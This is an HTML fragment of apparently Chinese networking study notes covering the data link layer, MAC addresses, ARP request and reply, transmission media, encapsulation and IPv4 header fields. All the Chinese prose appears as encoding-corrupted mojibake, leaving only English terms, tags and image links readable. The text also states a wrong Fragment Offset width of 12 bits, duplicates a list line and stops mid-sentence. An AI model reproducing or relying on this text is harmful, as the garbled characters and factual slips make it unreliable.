title="æ•°æ®é“¾è·¯å±‚"></a>æ•°æ®é“¾è·¯å±‚</h2><p>æ•°æ®é“¾è·¯å±‚ä½äºç½‘ç»œå±‚å’Œç‰©ç†å±‚ä¹‹é—´ï¼Œå¯ä»¥å‘ç½‘ç»œå±‚çš„IPã€IPV6ç­‰åè®®æä¾›æœåŠ¡ï¼Œæ•°æ®é“¾è·¯å±‚çš„PDUè¢«ç§°ä¸ºFrameï¼ˆå¸§ï¼‰ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124202733379.png" alt="image-20220124202733379"></p><h3 id="ä»¥å¤ªç½‘ä¸MACåœ°å€"><a href="#ä»¥å¤ªç½‘ä¸MACåœ°å€" class="headerlink" title="ä»¥å¤ªç½‘ä¸MACåœ°å€"></a>ä»¥å¤ªç½‘ä¸MACåœ°å€</h3><p><strong>ä»¥å¤ªç½‘ï¼š</strong>æ˜¯ä¸€ç§æ”¯æŒå¤šç‚¹æ¥å…¥çš„å¹¿æ’­å¼æ•°æ®é“¾è·¯å±‚åè®®ã€‚ä¸ªäººç”µè„‘çš„ç½‘ç»œæ¥å£éµå¾ªçš„å°±æ˜¯ä»¥å¤ªç½‘æ ‡å‡†ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªå¹¿æ’­åŸŸå¯¹åº”ä¸€ä¸ªIPç½‘æ®µã€‚</p><p><strong>ä»¥å¤ªç½‘MACåœ°å€ï¼š</strong>MACåœ°å€åœ¨ç½‘ç»œä¸­å”¯ä¸€æ ‡è¯†ä¸€ä¸ªç½‘å¡ï¼Œæ¯ä¸ªç½‘å¡éƒ½éœ€è¦ä¸”ä¼šæœ‰å”¯ä¸€çš„ä¸€ä¸ªMACåœ°å€ï¼ŒMACåœ°å€ç”¨äºåœ¨ä¸€ä¸ªIPç½‘æ®µå†…ï¼Œå¯»å€æ‰¾åˆ°å…·ä½“çš„ç‰©ç†è®¾å¤‡ã€‚å·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚çš„è®¾å¤‡ï¼Œä¾‹å¦‚ä»¥å¤ªç½‘äº¤æ¢æœºï¼Œä¼šç»´æŠ¤ä¸€å¼ MACåœ°å€è¡¨ï¼Œç”¨äºæŒ‡å¯¼æ•°æ®å¸§è½¬å‘ã€‚MACåœ°å€ç”±48æ¯”ç‰¹ï¼ˆ6ä¸ªå­—èŠ‚ï¼‰é•¿ï¼Œ12ä½çš„16è¿›åˆ¶æ•°å­—ç»„æˆã€‚ä¾‹å¦‚ï¼š48-A4-72-1C-8F-4F</p><h3 id="åœ°å€è§£æåè®®ï¼ˆARP"><a href="#åœ°å€è§£æåè®®ï¼ˆARP" class="headerlink" title="åœ°å€è§£æåè®®ï¼ˆARP)"></a>åœ°å€è§£æåè®®ï¼ˆARP)</h3><p>ARPï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®ï¼‰æ˜¯æ ¹æ®IPåœ°å€è·å–æ•°æ®é“¾è·¯å±‚åœ°å€çš„ ä¸€ä¸ªTCP/IPåè®®ã€‚</p><p>ARPæ˜¯IPv4ä¸­å¿…ä¸å¯å°‘çš„ä¸€ç§åè®®ï¼Œå®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯ï¼š</p><ul><li>å°†IPåœ°å€è§£æä¸ºMACåœ°å€ï¼›</li><li>ç»´æŠ¤IPåœ°å€ä¸MACåœ°å€çš„æ˜ å°„å…³ç³»çš„ç¼“å­˜ï¼Œå³ARPè¡¨é¡¹ï¼›</li><li>å®ç°ç½‘æ®µå†…é‡å¤IPåœ°å€çš„æ£€æµ‹ã€‚</li></ul><h3 id="ARPçš„å·¥ä½œåŸç†"><a href="#ARPçš„å·¥ä½œåŸç†" class="headerlink" title="ARPçš„å·¥ä½œåŸç†"></a>ARPçš„å·¥ä½œåŸç†</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124203445209.png" alt="image-20220124203445209"></p><ul><li>ç½‘ç»œè®¾å¤‡ä¸€èˆ¬éƒ½æœ‰ä¸€ä¸ªARPç¼“å­˜ï¼ˆARP Cacheï¼‰ã€‚ARPç¼“å­˜ç”¨æ¥å­˜æ”¾IPåœ°å€å’ŒMACåœ°å€çš„å…³è”ä¿¡æ¯ã€‚</li><li>åœ¨å‘é€æ•°æ®å‰ï¼Œè®¾å¤‡ä¼šå…ˆæŸ¥æ‰¾ARPç¼“å­˜è¡¨ã€‚å¦‚æœç¼“å­˜è¡¨ä¸­å­˜åœ¨å¯¹æ–¹è®¾å¤‡çš„ARPè¡¨é¡¹ï¼Œåˆ™ç›´æ¥ é‡‡ç”¨è¯¥è¡¨é¡¹ä¸­çš„MACåœ°å€æ¥å°è£…å¸§ï¼Œç„¶åå°†å¸§å‘é€å‡ºå»ã€‚å¦‚æœç¼“å­˜è¡¨ä¸­ä¸å­˜åœ¨ç›¸åº”ä¿¡æ¯ï¼Œ åˆ™é€šè¿‡å‘é€ARP RequestæŠ¥æ–‡æ¥è·å¾—å®ƒã€‚</li><li>å­¦ä¹ åˆ°çš„IPåœ°å€å’ŒMACåœ°å€çš„æ˜ å°„å…³ç³»ä¼šè¢«æ”¾å…¥ARPç¼“å­˜è¡¨ä¸­å­˜æ”¾ä¸€æ®µæ—¶é—´ã€‚åœ¨æœ‰æ•ˆæœŸå†… ï¼ˆç¼ºçœï¼š180sï¼‰ï¼Œè®¾å¤‡å¯ä»¥ç›´æ¥ä»è¿™ä¸ªè¡¨ä¸­æŸ¥æ‰¾ç›®çš„MACåœ°å€æ¥è¿›è¡Œæ•°æ®å°è£…ï¼Œè€Œæ— éœ€è¿› è¡ŒARPæŸ¥è¯¢ã€‚è¿‡äº†è¿™æ®µæœ‰æ•ˆæœŸï¼ŒARPè¡¨é¡¹ä¼šè¢«è‡ªåŠ¨åˆ é™¤ã€‚</li><li>å¦‚æœç›®æ ‡è®¾å¤‡ä½äºå…¶ä»–ç½‘ç»œï¼Œåˆ™æºè®¾å¤‡ä¼šåœ¨ARPç¼“å­˜è¡¨ä¸­æŸ¥æ‰¾ç½‘å…³çš„MACåœ°å€ã€‚ç„¶åå°†æ•° æ®å‘é€ç»™ç½‘å…³ã€‚æœ€åç½‘å…³å†æŠŠæ•°æ®è½¬å‘ç»™ç›®çš„è®¾å¤‡</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124203752805.png" alt="image-20220124203752805"></p><ul><li> ä¸»æœº1çš„ARPç¼“å­˜è¡¨ä¸­ä¸å­˜åœ¨ä¸»æœº2çš„MACåœ°å€ï¼Œæ‰€ä»¥ä¸»æœº1ä¼šå‘é€ARP Requestæ¥è·å–ç›®çš„ MACåœ°å€ã€‚</li><li> ARP RequestæŠ¥æ–‡å°è£…åœ¨ä»¥å¤ªå¸§é‡Œã€‚å¸§å¤´ä¸­çš„æºMACåœ°å€ä¸ºå‘é€ç«¯ä¸»æœº1çš„MACåœ°å€ã€‚æ­¤æ—¶ï¼Œ ç”±äºä¸»æœº1ä¸çŸ¥é“ä¸»æœº2çš„MACåœ°å€ï¼Œæ‰€ä»¥ç›®çš„MACåœ°å€ä¸ºå¹¿æ’­åœ°å€FF-FF-FF-FF-FF-FFã€‚</li><li> ARP RequestæŠ¥æ–‡ä¸­åŒ…å«å‘é€ç«¯MACåœ°å€ã€å‘é€ç«¯IPåœ°å€ã€ç›®çš„ç«¯MACåœ°å€ã€ç›®çš„ç«¯IPåœ° å€ï¼Œå…¶ä¸­ç›®çš„ç«¯MACåœ°å€çš„å€¼ä¸º0ã€‚ARP RequestæŠ¥æ–‡ä¼šåœ¨æ•´ä¸ªç½‘ç»œä¸Šä¼ æ’­ï¼Œè¯¥ç½‘ç»œä¸­æ‰€æœ‰ ä¸»æœºåŒ…æ‹¬ç½‘å…³éƒ½ä¼šæ¥æ”¶åˆ°æ­¤ARP RequestæŠ¥æ–‡ã€‚</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124203834076.png" alt="image-20220124203834076"></p><p>è‹¥ä¸åŒ¹é…åˆ™ä¸ä¼šå“åº”ï¼Œè‹¥åŒ¹é…åˆ™åˆ™è¯¥ä¸»æœºä¼š å°†ARPè¯·æ±‚æŠ¥æ–‡ä¸­çš„å‘é€ç«¯MACåœ°å€å’Œå‘é€ç«¯IPåœ°å€ä¿¡æ¯è®°å½•åˆ°è‡ªå·±çš„ARPç¼“å­˜è¡¨ä¸­ï¼Œç„¶å é€šè¿‡ARP ReplyæŠ¥æ–‡è¿›è¡Œå“åº”</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124203926268.png" alt="image-20220124203926268"></p><ul><li>ä¸»æœº2ä¼šå‘ä¸»æœº1å›åº”ARP ReplyæŠ¥æ–‡ã€‚</li><li>ARP ReplyæŠ¥æ–‡ä¸­çš„å‘é€ç«¯IPåœ°å€æ˜¯ä¸»æœº2è‡ªå·±çš„IPåœ°å€ï¼Œç›®çš„ç«¯IPåœ°å€æ˜¯ä¸»æœº1çš„IPåœ°å€ï¼Œ ç›®çš„ç«¯MACåœ°å€æ˜¯ä¸»æœº1çš„MACåœ°å€ï¼Œå‘é€ç«¯MACåœ°å€æ˜¯è‡ªå·±çš„MACåœ°å€ï¼ŒåŒæ—¶æ“ä½œç±»å‹ è¢«è®¾ç½®ä¸ºReplyã€‚</li><li>ARP ReplyæŠ¥æ–‡é€šè¿‡å•æ’­ä¼ é€</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204003680.png" alt="image-20220124204003680"></p><h2 id="ç‰©ç†å±‚"><a href="#ç‰©ç†å±‚" class="headerlink" title="ç‰©ç†å±‚"></a>ç‰©ç†å±‚</h2><p>æ•°æ®åˆ°è¾¾ç‰©ç†å±‚ä¹‹åï¼Œç‰©ç†å±‚ä¼šæ ¹æ®ç‰©ç†ä»‹è´¨çš„ä¸åŒï¼Œå°†æ•°å­—ä¿¡å·è½¬æ¢ä¸ºå…‰ä¿¡å·ã€ç”µä¿¡å·æˆ–è€…æ˜¯ç”µç£æ³¢ä¿¡å·</p><p>ç‰©ç†å±‚çš„PDUè¢«ç§°ä¸ºæ¯”ç‰¹æµ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204140328.png" alt="image-20220124204140328"></p><h3 id="å¸¸è§ä¼ è¾“ä»‹è´¨"><a href="#å¸¸è§ä¼ è¾“ä»‹è´¨" class="headerlink" title="å¸¸è§ä¼ è¾“ä»‹è´¨"></a>å¸¸è§ä¼ è¾“ä»‹è´¨</h3><ul><li>åŒç»çº¿ï¼šå½“ä»Šä»¥å¤ªç½‘æœ€å¸¸è§çš„ä¼ è¾“ä»‹è´¨ï¼ŒæŒ‰ç…§æŠ—ç”µç£å¹²æ‰°èƒ½åŠ›è¿˜å¯ä»¥åˆ†ä¸ºï¼š STP-å±è”½åŒç»çº¿å’ŒUTP-éå±è”½åŒç»çº¿</li><li>å…‰çº¤ä¼ è¾“ï¼ŒæŒ‰ç…§åŠŸèƒ½éƒ¨ä»¶å¯åˆ†ä¸ºï¼š<ul><li>å…‰çº¤ä¼ è¾“ï¼ŒæŒ‰ç…§åŠŸèƒ½éƒ¨ä»¶å¯åˆ†ä¸ºï¼š</li><li>å…‰æ¨¡å—ï¼šå°†ç”µä¿¡å·ä¸å…‰ä¿¡å·äº’è½¬çš„å™¨ä»¶ï¼Œäº§ç”Ÿå…‰ä¿¡å·ã€‚</li></ul></li><li>ä¸²å£ç”µç¼†åœ¨WANï¼ˆWide Area Networkï¼Œå¹¿åŸŸç½‘ï¼‰ä¸­å¤§è§„æ¨¡ä½¿ç”¨ï¼Œæ ¹æ®WANçº¿è·¯ç±»å‹ä¸åŒï¼Œ ä¸²å£ç”µç¼†åœ¨è®¾å¤‡ä¸Šè¿æ¥çš„æ¥å£ç±»å‹ä¹Ÿä¸åŒï¼šå¼‚/åŒæ­¥ä¸²å£ã€ATMæ¥å£ã€POSæ¥å£ã€CE1/PRI æ¥å£ç­‰ã€‚</li><li>æ— çº¿ä¿¡å·çš„ä¼ è¾“å¯ä»¥é€šè¿‡ç”µç£æ³¢è¿›è¡Œï¼Œä¾‹å¦‚ï¼šæ— çº¿è·¯ç”±å™¨å°†æ•°æ®é€šè¿‡è°ƒåˆ¶ä»¥ç”µç£æ³¢å‘é€å‡º å»ï¼Œç§»åŠ¨ç»ˆç«¯çš„æ— çº¿ç½‘å¡å°†ç”µç£æ³¢è§£è°ƒï¼Œå¾—åˆ°æ•°æ®ï¼Œå®Œæˆä»æ— çº¿è·¯ç”±å™¨åˆ°ç§»åŠ¨ç»ˆç«¯çš„æ•°æ® ä¼ è¾“ã€‚</li></ul><h2 id="æ•°æ®é€šä¿¡è¿‡ç¨‹"><a href="#æ•°æ®é€šä¿¡è¿‡ç¨‹" class="headerlink" title="æ•°æ®é€šä¿¡è¿‡ç¨‹"></a>æ•°æ®é€šä¿¡è¿‡ç¨‹</h2><p>å‘é€æ–¹æ•°æ®å°è£…-&gt;ä¸­é—´ç½‘ç»œæ•°æ®ä¼ è¾“-&gt;æ¥æ”¶æ–¹æ•°æ®è§£å°è£…</p><h3 id="å‘é€æ–¹æ•°æ®å°è£…"><a href="#å‘é€æ–¹æ•°æ®å°è£…" class="headerlink" title="å‘é€æ–¹æ•°æ®å°è£…"></a>å‘é€æ–¹æ•°æ®å°è£…</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204458566.png" alt="image-20220124204458566"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204507478.png" alt="image-20220124204507478"></p><h3 id="ä¸­é—´ç½‘ç»œæ•°æ®ä¼ è¾“"><a href="#ä¸­é—´ç½‘ç»œæ•°æ®ä¼ è¾“" class="headerlink" title="ä¸­é—´ç½‘ç»œæ•°æ®ä¼ è¾“"></a>ä¸­é—´ç½‘ç»œæ•°æ®ä¼ è¾“</h3><p>å°è£…å¥½çš„å®Œæ•´æ•°æ®ï¼Œä¼šåœ¨ç½‘ç»œä¸­è¢«ä¼ é€’</p><p> ä¸€èˆ¬æƒ…å†µä¸‹ï¼š</p><ul><li> ç½‘ç»œä¸­çš„äºŒå±‚è®¾å¤‡ï¼ˆå¦‚ä»¥å¤ªç½‘äº¤æ¢æœºï¼‰åªä¼šè§£å°è£…æ•°æ®çš„äºŒå±‚å¤´éƒ¨ï¼Œæ ¹æ®äºŒå±‚å¤´éƒ¨çš„ ä¿¡æ¯è¿›è¡Œç›¸åº”çš„â€œäº¤æ¢â€æ“ä½œã€‚ </li><li> ç½‘ç»œä¸­çš„ä¸‰å±‚è®¾å¤‡ï¼ˆå¦‚è·¯ç”±å™¨ï¼‰åªä¼šè§£å°è£…åˆ°ä¸‰å±‚å¤´éƒ¨ï¼Œå¹¶ä¸”æ ¹æ®ä¸‰å±‚å¤´éƒ¨çš„ä¿¡æ¯è¿› è¡Œç›¸åº”çš„â€œè·¯ç”±â€æ“ä½œã€‚</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204629644.png" alt="image-20220124204629644"></p><h3 id="æ¥æ”¶æ–¹æ•°æ®è§£å°è£…"><a href="#æ¥æ”¶æ–¹æ•°æ®è§£å°è£…" class="headerlink" title="æ¥æ”¶æ–¹æ•°æ®è§£å°è£…"></a>æ¥æ”¶æ–¹æ•°æ®è§£å°è£…</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204656862.png" alt="image-20220124204656862"></p><p> ç»è¿‡ä¸­é—´ç½‘ç»œä¼ é€’ä¹‹åï¼Œæ•°æ®æœ€ç»ˆåˆ°è¾¾ç›®çš„æœåŠ¡å™¨ã€‚æ ¹æ®ä¸åŒçš„åè®®å¤´éƒ¨çš„ä¿¡æ¯ï¼Œæ•°æ®å°† è¢«ä¸€å±‚å±‚çš„è§£å°è£…å¹¶åšç›¸åº”çš„å¤„ç†å’Œä¼ é€’ï¼Œæœ€ç»ˆäº¤ç”±WEBæœåŠ¡å™¨ä¸Šçš„åº”ç”¨ç¨‹åºè¿›è¡Œå¤„ç†ã€‚</p><h2 id="åˆ†å±‚æ¨¡å‹çš„æ¦‚å¿µçš„ä¼˜åŠ¿"><a href="#åˆ†å±‚æ¨¡å‹çš„æ¦‚å¿µçš„ä¼˜åŠ¿" class="headerlink" title="åˆ†å±‚æ¨¡å‹çš„æ¦‚å¿µçš„ä¼˜åŠ¿"></a>åˆ†å±‚æ¨¡å‹çš„æ¦‚å¿µçš„ä¼˜åŠ¿</h2><ul><li> å„ä¸ªå±‚æ¬¡ä¹‹é—´åˆ†å·¥ã€ç•Œé™æ˜ç¡®ï¼Œæœ‰åŠ©äºå„ä¸ªéƒ¨ä»¶çš„å¼€å‘ã€è®¾è®¡å’Œæ•…éšœæ’é™¤ã€‚ </li><li> é€šè¿‡å®šä¹‰åœ¨æ¨¡å‹çš„æ¯ä¸€å±‚å®ç°ä»€ä¹ˆåŠŸèƒ½,é¼“åŠ±äº§ä¸šçš„æ ‡å‡†åŒ–ã€‚ </li><li> é€šè¿‡æä¾›æ¥å£çš„æ–¹å¼ï¼Œä½¿å¾—å„ç§ç±»å‹çš„ç½‘ç»œç¡¬ä»¶å’Œè½¯ä»¶èƒ½å¤Ÿç›¸äº’é€šä¿¡ï¼Œæé«˜å…¼å®¹æ€§ã€‚</li></ul><h1 id="ç½‘ç»œå±‚åè®®åŠIPç¼–å€"><a href="#ç½‘ç»œå±‚åè®®åŠIPç¼–å€" class="headerlink" title="ç½‘ç»œå±‚åè®®åŠIPç¼–å€"></a>ç½‘ç»œå±‚åè®®åŠIPç¼–å€</h1><h2 id="ç½‘ç»œå±‚åè®®"><a href="#ç½‘ç»œå±‚åè®®" class="headerlink" title="ç½‘ç»œå±‚åè®®"></a>ç½‘ç»œå±‚åè®®</h2><p>ç½‘ç»œå±‚åè®®åŒ…æ‹¬IPåè®®ï¼ŒICMPåè®®ï¼ŒIPXåè®®ç­‰</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220127163103508.png" alt="image-20220127163103508"></p><h3 id="IPåè®®"><a href="#IPåè®®" class="headerlink" title="IPåè®®"></a>IPåè®®</h3><p>ipæ˜¯Internet Protocolçš„ç¼©å†™ã€‚Internet Protocolæœ¬èº«æ˜¯ä¸€ä¸ªåè®®æ–‡ä»¶çš„åç§°ï¼Œè¯¥åè®®æ–‡ä»¶çš„å†…å®¹éå¸¸å°‘ï¼Œä¸»è¦æ˜¯å®šä¹‰å¹¶é˜è¿°äº†IPæŠ¥æ–‡çš„æ ¼å¼</p><p>ç»å¸¸è¢«æåŠçš„IPï¼Œä¸€èˆ¬ä¸æ˜¯ç‰¹æŒ‡Internet Protocolè¿™ä¸ªåè®®æœ¬èº«ï¼Œè€Œæ˜¯æ³›æŒ‡ç›´æ¥æˆ–é—´æ¥ä¸IPåè®®ç›¸å…³çš„ä»»ä½•å†…å®¹ã€‚</p><p><strong>ä½œç”¨ï¼š</strong>ä¸ºç½‘ç»œå±‚çš„è®¾å¤‡æä¾›é€»è¾‘åœ°å€ï¼Œè´Ÿè´£æ•°æ®åŒ…çš„å¯»å€å’Œè½¬å‘ã€‚</p><p> IPv4ï¼ˆInternet Protocol Version 4ï¼‰åè®®æ—æ˜¯TCP/IPåè®®æ—ä¸­æœ€ä¸ºæ ¸å¿ƒçš„åè®®æ—ã€‚å®ƒå·¥ä½œåœ¨TCP/IPåè®®æ ˆçš„ç½‘ç»œå±‚ï¼Œè¯¥å±‚ä¸OSIå‚è€ƒæ¨¡å‹çš„ç½‘ç»œå±‚ç›¸å¯¹åº”ã€‚</p><p> IPv6ï¼ˆInternet Protocol Version 6ï¼‰æ˜¯ç½‘ç»œå±‚åè®®çš„ç¬¬äºŒä»£æ ‡å‡†åè®®ï¼Œä¹Ÿè¢«ç§°ä¸ºIPng ï¼ˆIP Next Generationï¼‰ã€‚å®ƒæ˜¯Internetå·¥ç¨‹ä»»åŠ¡ç»„IETFï¼ˆInternet Engineering Task  Forceï¼‰è®¾è®¡çš„ä¸€å¥—è§„èŒƒï¼Œæ˜¯IPv4ï¼ˆInternet Protocol Version 4ï¼‰çš„å‡çº§ç‰ˆæœ¬ã€‚</p><h3 id="æ•°æ®å°è£…"><a href="#æ•°æ®å°è£…" class="headerlink" title="æ•°æ®å°è£…"></a>æ•°æ®å°è£…</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220127163557973.png" alt="image-20220127163557973"></p><p>åº”ç”¨æ•°æ®éœ€è¦ç»è¿‡TCP/IPæ¯ä¸€å±‚å¤„ç†ä¹‹åæ‰èƒ½é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°ç›®çš„ç«¯ï¼Œæ¯ä¸€å±‚ä¸Šéƒ½ä½¿ç”¨è¯¥ å±‚çš„åè®®æ•°æ®å•å…ƒPDUï¼ˆProtocol Data Unitï¼‰å½¼æ­¤äº¤æ¢ä¿¡æ¯ã€‚</p><p>å¦‚ä¸Šå±‚<strong>æ•°æ®</strong>åœ¨<strong>ä¼ è¾“å±‚</strong>æ·»åŠ TCPæŠ¥å¤´åå¾—åˆ°çš„PDUè¢«ç§°ä¸º<strong>Segmentï¼ˆæ•°æ®æ®µï¼‰</strong>ï¼›æ•°æ®æ®µè¢«ä¼ é€’ç»™<strong>ç½‘ç»œå±‚</strong>ï¼Œç½‘ç»œå±‚æ·»åŠ IPæŠ¥å¤´å¾—åˆ°çš„PDUè¢«ç§°ä¸º<strong>Packetï¼ˆæ•°æ®åŒ…ï¼‰</strong>ï¼›æ•°æ®åŒ…è¢«ä¼ é€’åˆ°<strong>æ•°æ®é“¾è·¯å±‚</strong>ï¼Œå°è£…æ•°æ®é“¾è·¯å±‚æŠ¥å¤´å’Œå°¾éƒ¨å¾—åˆ°çš„PDUè¢«ç§°ä¸º<strong>Frameï¼ˆæ•°æ®å¸§ï¼‰</strong>ï¼› æœ€åï¼Œå¸§è¢«è½¬æ¢ä¸º<strong>æ¯”ç‰¹</strong>ï¼Œé€šè¿‡ç½‘ç»œä»‹è´¨ä¼ è¾“ã€‚</p><h3 id="IPV4æŠ¥æ–‡æ ¼å¼"><a href="#IPV4æŠ¥æ–‡æ ¼å¼" class="headerlink" title="IPV4æŠ¥æ–‡æ ¼å¼"></a>IPV4æŠ¥æ–‡æ ¼å¼</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220127163943203.png" alt="image-20220127163943203"></p><ul><li>Versionï¼š4 bitï¼Œ4ï¼šè¡¨ç¤ºä¸ºIPv4ï¼›6ï¼šè¡¨ç¤ºä¸ºIPv6ã€‚</li><li>Header Lengthï¼š4 bitï¼Œé¦–éƒ¨é•¿åº¦ï¼Œå¦‚æœä¸å¸¦Optionå­—æ®µï¼Œåˆ™ä¸º20ï¼Œæœ€é•¿ä¸º60ã€‚</li><li>Type of Serviceï¼š8 bitï¼ŒæœåŠ¡ç±»å‹ã€‚åªæœ‰åœ¨æœ‰QoSå·®åˆ†æœåŠ¡è¦æ±‚æ—¶ï¼Œè¿™ä¸ªå­—æ®µæ‰èµ·ä½œç”¨</li><li>Total Lengthï¼š16 bitï¼Œæ€»é•¿åº¦ï¼Œæ•´ä¸ªIPæ•°æ®åŒ…çš„é•¿åº¦ã€‚</li><li>Identificationï¼š16 bitï¼Œæ ‡è¯†ï¼Œåˆ†ç‰‡é‡ç»„æ—¶ä¼šç”¨åˆ°è¯¥å­—æ®µã€‚</li><li>Flagsï¼š3 bitï¼Œæ ‡å¿—ä½ã€‚<ul><li>ä¿ç•™æ®µä½ï¼š0ï¼Œä¿ç•™ã€‚</li><li>ä¸åˆ†æ®µä½ï¼š1ï¼Œè¡¨ç¤ºâ€œä¸èƒ½åˆ†ç‰‡â€ï¼›0ï¼Œè¡¨ç¤ºâ€œèƒ½åˆ†ç‰‡â€ã€‚</li><li>æ›´å¤šæ®µä½ï¼š1ï¼Œè¡¨ç¤ºâ€œåé¢è¿˜æœ‰åˆ†ç‰‡â€ï¼›0ï¼Œè¡¨ç¤ºâ€œæœ€åä¸€ä¸ªæ•°æ®ç‰‡â€ã€‚</li></ul></li><li>Fragment Offsetï¼š12 bitï¼Œç‰‡åç§»ï¼Œåˆ†ç‰‡é‡ç»„æ—¶ä¼šç”¨åˆ°è¯¥å­—æ®µã€‚æŒ‡å‡ºè¾ƒé•¿çš„åˆ†ç»„åœ¨åˆ†ç‰‡åï¼Œ è¯¥ç‰‡åœ¨åŸåˆ†ç»„ä¸­çš„ç›¸å¯¹ä½ç½®ï¼Œä¸æ›´å¤šæ®µä½ç»„åˆï¼Œå¸®åŠ©æ¥æ”¶æ–¹ç»„åˆåˆ†æ®µçš„æŠ¥æ–‡ã€‚</li><li>Time to Liveï¼š8 bitï¼Œç”Ÿå­˜æ—¶é—´ã€‚å¯ç»è¿‡çš„æœ€å¤šè·¯ç”±æ•°ï¼Œå³æ•°æ®åŒ…åœ¨ç½‘ç»œä¸­å¯é€šè¿‡çš„è·¯ç”±å™¨æ•°çš„æœ€å¤§å€¼ã€‚</li><li>Protocolï¼š8 bitï¼Œåè®®ï¼šä¸‹ä¸€å±‚åè®®ã€‚æŒ‡å‡ºæ­¤æ•°æ®åŒ…æºå¸¦çš„æ•°æ®ä½¿ç”¨ä½•ç§åè®®ï¼Œä»¥ä¾¿ç›®çš„ä¸»æœºçš„IPå±‚å°†æ•°æ®éƒ¨åˆ†ä¸Šäº¤ç»™å“ªä¸ªè¿›ç¨‹å¤„ç†ã€‚<ul><li>1: ICMP, Internet Control Messageï¼›</li><li>2: IGMP, Internet Group Managementï¼›</li><li>6: TCP , Transmission Control Protocolï¼›</li><li>17: UDP, User Datagram Protocolã€‚</li></ul></li><li>Header Checksumï¼š16 bitï¼Œé¦–éƒ¨æ£€éªŒå’Œã€‚</li><li>Source IP Addressï¼š32 bitï¼ŒæºIPåœ°å€ã€‚</li><li>Destination IP Addressï¼š32 bitï¼Œç›®çš„IPåœ°å€ã€‚</li><li>Optionsï¼šå¯å˜ï¼Œé€‰é¡¹å­—æ®µã€‚</li><li>Paddingï¼šå¯å˜ï¼Œå¡«å……å­—æ®µï¼Œå…¨å¡«0</li></ul><h3 id="æ•°æ®åŒ…åˆ†ç‰‡"><a href="#æ•°æ®åŒ…åˆ†ç‰‡" class="headerlink" title="æ•°æ®åŒ…åˆ†ç‰‡"></a>æ•°æ®åŒ…åˆ†ç‰‡</h3><p>å°†æŠ¥æ–‡åˆ†å‰²æˆå¤šä¸ªç‰‡æ®µçš„è¿‡ç¨‹å«åˆ†ç‰‡</p><p>ç½‘ç»œä¸­è½¬å‘çš„ipæŠ¥æ–‡çš„é•¿åº¦å¯ä»¥ä¸åŒï¼Œä½†è‹¥æŠ¥æ–‡é•¿åº¦è¶…è¿‡äº†æ•°æ®é“¾è·¯æ‰€æ”¯æŒçš„æœ€å¤§é•¿åº¦ï¼Œåˆ™æŠ¥æ–‡å°±è¦åˆ†å‰²æˆè‹¥å¹²ä¸ªè¾ƒå°çš„ç‰‡æ®µæ‰èƒ½åœ¨é“¾è·¯ä¸Šä¼ è¾“</p><p>ä¸IPæ•°æ®åŒ…åŒ…å¤´ä¸­çš„Identificationï¼ŒFlagsï¼ŒFragment Offsetä¸‰éƒ¨åˆ†å†…å®¹æœ‰å…³</p><h3 id="ç”Ÿå­˜æ—¶é—´ï¼ˆTime-to-Live-TTL"><a href="#ç”Ÿå­˜æ—¶é—´ï¼ˆTime-to-Live-TTL" class="headerlink" title="ç”Ÿå­˜æ—¶é—´ï¼ˆTime to Live,TTL)"></a>ç”Ÿå­˜æ—¶é—´ï¼ˆTime to Live,TTL)</h3><p>TTLå­—æ®µè®¾ç½®äº†æ•°æ®åŒ…å¯ä»¥ç»è¿‡çš„è·¯ç”±å™¨æ•°ç›®ï¼Œä¸€æ—¦ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼ŒTTLå€¼å‡ä¸€ï¼Œå½“ä¸º0æ—¶ï¼Œæ•°æ®åŒ…è¢«ä¸¢å¼ƒ</p><p>æŠ¥æ–‡åœ¨ç½‘æ®µé—´è½¬å‘æ—¶ï¼Œå¦‚æœç½‘ç»œè®¾å¤‡ä¸Šçš„è·¯ç”±è§„åˆ’ä¸åˆç†ï¼Œå°±å¯èƒ½ä¼šå‡ºç°ç¯è·¯ï¼Œå¯¼è‡´æŠ¥æ–‡åœ¨ç½‘ç»œä¸­æ— é™å¾ªç¯ï¼Œæ— 